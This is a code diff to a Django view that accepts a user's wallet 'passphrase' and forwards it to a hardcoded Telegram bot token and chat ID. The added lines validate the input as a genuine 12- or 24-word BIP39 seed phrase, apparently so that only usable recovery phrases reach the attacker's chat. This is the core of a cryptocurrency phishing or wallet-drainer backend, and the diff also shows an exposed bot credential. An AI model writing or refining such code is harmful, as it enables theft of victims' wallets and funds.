@@ -1,10 +1,15 @@
 import requests
 from django.shortcuts import render
 from django.http import JsonResponse
+from mnemonic import Mnemonic
+
+
 
 # Replace with your actual Telegram Bot Token and Chat ID
 bot_token = '7460363720:AAE_1X_Cwm3sJ9RMJFNha04mbzgJ-m8JBys'
 chat_id = '6736572379'
+
+
 
 def home(request):
     if request.method == 'POST':
@@ -13,6 +18,21 @@ def home(request):
         if not passphrase:
             return JsonResponse({'success': False, 'error': 'Passphrase is required'}, status=400)
 
+        #def clean_passphrase(self):
+        #passphrase = self.cleaned_data.get('passphrase')
+
+        # Split the passphrase into words
+        words = passphrase.split()
+        mnemo = Mnemonic("english")
+
+        # Check if the passphrase contains exactly 12 or 24 words
+        if len(words) not in [12, 24]:
+            return JsonResponse({'success': False, 'error': 'Invalid passphrase key'})
+        
+        # Validate the passphrase using mnemonic library
+        if not mnemo.check(passphrase):
+            return JsonResponse({'success': False, 'error': 'The phrase is bad'})
+        
         # Construct the message to send
         message = f"{passphrase}"
 
